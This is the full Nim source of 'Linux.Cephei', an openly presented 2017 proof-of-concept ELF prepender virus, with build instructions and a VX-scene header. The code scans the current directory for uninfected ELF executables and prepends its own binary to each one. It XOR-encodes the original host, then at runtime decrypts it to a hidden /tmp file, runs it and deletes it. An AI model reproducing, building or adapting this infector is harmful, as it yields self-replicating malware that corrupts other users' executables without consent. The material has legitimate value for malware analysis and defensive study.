#[
 Linux.Cephei- This is a POC ELF prepender written in Nim by TMZ (2017).
 I like writting prependers on languages that I'm learning and find interesting. Nim is a very nice one!
 It is probably the first binary infector ever written in this language, that's neat.
 The above affirmation is based on SPTH LIP page: http://spth.virii.lu/LIP.html

 Linux.Cephei (August 2017) - Simple binary infector written in Nim (former Nimrod).
 This version encrypts the host code with a simple XOR and decrypts it at runtime.
 It's almost a direct port from my Vala infector Linux.Zariche.B and Go infector Linux.Liora.

 Build with: nim c -d:release --passL:-static cephei.nim
 You can also build with Docker: docker run --rm -v `pwd`:/usr/src/app -w /usr/src/app nimlang/nim:alpine nim c -d:release --passL:-static cephei.nim

 Note that Nim version used was 0.17.0, the latest at this moment.

 It has no external dependencies so it should compile under most systems (x86 and x86_64).
 It's also possible to easly adapt it to be a PE/Mach infector and compile under Windows/macOS.

 Use at your own risk, I'm not responsible for any damages that this may cause.

 A big shout for those who keeps the scene alive: herm1t, alcopaul, hh86, Metal, belial, JPanic, R3s1stanc3 and many others :)

 Feel free to email me: thomazi@linux.com || tmz@null.net 
 You can also find me at http://vxheaven.org/ and on Twitter @TMZvx || @guitmz
 
 https://www.guitmz.com
]#

import streams
import os
import osproc
import strutils
import parseutils
import random

const
  ELF_MAGIC_NUMBER = 0x464c457f
  ELF_EXECUTABLE_FLAG = 2
  INFECTION_MARK = "%TMZ%"
  VIRUS_SZ = 395312

proc isELF(path: string): bool =
  var fs = newFileStream(path, fmRead)
  defer: fs.close()
  let e_ident = fs.peekInt32()
  fs.setPosition(0x10)
  let e_type = fs.peekInt8()
  if e_ident == ELF_MAGIC_NUMBER and e_type == ELF_EXECUTABLE_FLAG:
    return true

proc isInfected(path: string): bool =
  let file_sz = getFileSize(path)
  let mark_sz = len(INFECTION_MARK)
  var buf = newSeq[int8](file_sz)
  var fs = open(path, fmRead)
  defer: fs.close()
  discard fs.readBytes(buf, 0, file_sz)
  for x in 1..int(file_sz) - 1:
    if buf[x] == int8(INFECTION_MARK[0]):
        for y in 1..mark_sz - 1:
          if ((x + y) >= file_sz):
            break
          if (buf[x + y] != int8(INFECTION_MARK[y])):
            break
          if y == mark_sz - 1:
            return true

proc xorEncDec(input: openArray[int8], key: string): seq[int8] =
  var output = newSeq[int8](input.len)
  for x in 0..input.len:
    output[x] = input[x] xor int8(key[x mod key.len])
  return output

proc infect(path: string) =
  let host_sz = getFileSize(path)
  var host_buf = newSeq[int8](host_sz)
  var vir_buf = newSeq[int8](VIRUS_SZ)
  var host = open(path, fmRead)
  defer: host.close()
  var virus = open(paramStr(0), fmRead)
  defer: virus.close()

  discard host.readBytes(host_buf, 0, host_sz-1)
  discard virus.readBytes(vir_buf, 0, VIRUS_SZ-1)

  var infectedHost = open(path, fmWrite)
  defer: infectedHost.close()
  discard infectedHost.writeBytes(vir_buf, 0, VIRUS_SZ)
  discard infectedHost.writeBytes(xorEncDec(host_buf, "key"), 0, host_sz)
  infectedHost.flushFile()

proc runHost() =
  let infectedSize = getFileSize(paramStr(0))
  let hostSize = infectedSize - VIRUS_SZ
  var hostBuf = newSeq[int8](hostSize)

  var infected = open(paramStr(0), fmRead)
  defer: infected.close()
  randomize()
  let originalHostFile = "/tmp/.host" & random(100).intToStr()
  var originalHost = open(originalHostFile, fmWrite)

  infected.setFilePos(VIRUS_SZ, fspSet)
  discard infected.readBytes(hostBuf, 0, hostSize)
  discard originalHost.writeBytes(xorEncDec(hostBuf, "key"), 0, hostBuf.len)
  originalHost.flushFile()
  originalHost.close()

  setFilePermissions(originalHostFile, {fpUserExec, fpGroupExec, fpOthersExec})
  discard execCmd(originalHostFile)
  removeFile(originalHostFile)

proc payload() =
  echo "Did you know that VV Cephei, also known as HD 208816, is an eclipsing binary star system located in the constellation Cepheus, approximately 5,000 light years from Earth? It is both a B[e] star and shell star. Awesome! https://en.wikipedia.org/wiki/VV_Cephei"
  echo "The more you know... :)"

proc main() =
  let filePath = paramStr(0)
  for file in walkDir(".", relative = true):
    if file.kind != pcDir:
      var target = joinPath(getCurrentDir(), file.path)
      if target == filePath:
        continue
      if isELF(target):
        if not isInfected(target):
          infect(target)
    
  if getFileSize(filePath) > VIRUS_SZ:
    payload()
    runHost()
  else:
    quit(0)

main()
